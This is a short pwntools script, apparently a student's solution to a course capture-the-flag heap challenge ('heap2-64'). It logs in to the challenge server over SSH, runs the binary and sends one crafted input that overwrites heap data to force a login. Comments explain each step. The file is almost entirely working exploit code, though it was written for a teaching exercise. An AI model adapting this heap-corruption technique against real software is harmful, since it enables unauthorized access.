#!/usr/bin/python
from pwn import *

context.clear(arch='amd64', log_level='debug')
context.terminal = 'tmux'

s = ssh('jjcabral', 'cs4401shell2.walls.ninja', keyfile='jjcabral_ssh_key')
s.set_working_directory('/problems/heap2r-64_0_467c1c42c85e7d8de28eedaf1beabf60')
p = s.process(['./heap2-64'])


exploit_str = b"zoomcall BBBBBB\nauth \nzoomcall AABB CCD\x01\x00\x00\x00\nlogin\n"

p.sendline(exploit_str)

p.recvall()
p.wait()



#First call zoomcall 6
#then call auth blank space
#then call zoomcall med long
#AABBCCD BYTEHEX (DEEF)
#       0x46454544
#then call login